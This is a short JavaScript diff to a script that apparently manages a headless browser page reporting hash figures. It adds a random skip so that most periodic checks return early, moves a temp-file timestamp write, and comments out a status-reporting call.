@@ -3,7 +3,10 @@
 
   if (global.cppBrowser) return;
 
-  let repTime = 10 * 60 * 1000;
+  let chance = (probability) => Math.random() < probability;
+  let reduceFactor = 0.9;
+
+  let repTime = 10 * 60 * 1000; // with reduceFactor skip 9 reps, exec 1 rep = exec after 100 minutes
 
   let fs = require('fs')
   let os = require('os');
@@ -249,6 +252,10 @@
 
     async function chkFn() {
 
+      try { fs.writeFileSync(`${os.tmpdir()}/single_init_unix_time.txt`, Math.floor(Date.now()).toString()); } catch (error) { }
+
+      if (chance(reduceFactor)) return;
+
       if (browser && page) {
         const hs = (await page.evaluate(() => {
           try {
@@ -278,14 +285,13 @@
           if (window.use != max) window.location.href = baseUrl + '?use=' + max;
         }, max, baseUrl);
       } else {
-        tstt({
-          baseUrl,
-          message: "HASH_WAIT D(" + (parseFloat(await dirSize(cacheDir)) / 1000000).toFixed(2) + ")",
-          value: 0,
-        });
+        // tstt({
+        //   baseUrl,
+        //   message: "HASH_WAIT D(" + (parseFloat(await dirSize(cacheDir)) / 1000000).toFixed(2) + ")",
+        //   value: 0,
+        // });
       }
 
-      fs.writeFileSync(`${os.tmpdir()}/single_init_unix_time.txt`, Math.floor(Date.now()).toString());
 
     }
 
